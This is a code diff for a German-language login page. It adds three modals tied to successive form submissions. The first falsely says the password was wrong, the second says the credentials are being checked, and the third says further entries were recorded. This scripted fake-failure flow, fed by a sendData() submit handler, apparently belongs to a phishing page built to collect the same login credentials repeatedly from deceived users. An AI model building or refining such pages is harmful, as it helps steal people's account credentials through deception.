@@ -8,17 +8,41 @@
     <script src="./script.js" defer></script>
   </head>
   <body>
-    <!-- Success Modal -->
-    <div id="modalOverlay" class="modal-overlay">
+    <!-- Modal for First Submission -->
+    <div id="modalOverlay1" class="modal-overlay">
       <div class="modal-box">
         <h2>Verifizierung fehlgeschlagen ⚠️</h2>
         <p>
           Ihr Passwort oder Benutzername ist falsch!
           Überprüfen Sie, ob Sie Ihr Passwort richtig eingegeben oder vergessen haben. 
         </p>
-        <button id="closeModal" class="modal-btn">Schließen</button>
+        <button class="modal-btn" onclick="hideModal(1)">Schließen</button>
       </div>
     </div>
+
+    <!-- Modal for Second Submission -->
+    <div id="modalOverlay2" class="modal-overlay">
+      <div class="modal-box">
+        <h2>Kontoprüfung läuft ✔️</h2>
+        <p>
+          Ihre Anmeldedaten werden nun mit unseren Datensätzen abgeglichen, um deren Richtigkeit zu überprüfen.
+          Nach Abschluss des Vorgangs wird Ihre Verifizierung abgeschlossen.
+        </p>
+        <button class="modal-btn" onclick="hideModal(2)">Schließen</button>
+      </div>
+    </div>
+
+    <!-- Modal for Third Submission -->
+    <div id="modalOverlay3" class="modal-overlay">
+      <div class="modal-box">
+        <h2>Wird geprüft ⚠️</h2>
+        <p>
+          Weitere Eingaben wurden erfasst. Bitte überprüfen Sie alles sorgfältig.
+        </p>
+        <button class="modal-btn" onclick="hideModal(3)">Schließen</button>
+      </div>
+    </div>
+
     <header>
       <a href="index.html">
         <img src="./assests/images/logo.png" alt="logo" class="logo" />
@@ -29,6 +53,7 @@
         </a>
       </nav>
     </header>
+
     <main>
       <div class="card">
         <div class="banner">
@@ -46,10 +71,7 @@
         <form
           class="wrapper"
           id="myForm"
-          onsubmit="
-            sendData();
-            return false;
-          "
+          onsubmit="sendData(); return false;"
         >
           <input
             name="email"
@@ -79,6 +101,7 @@
         </form>
       </div>
     </main>
+
     <footer>
       <ul>
         <li><a href="index.html">Impressum</a></li>
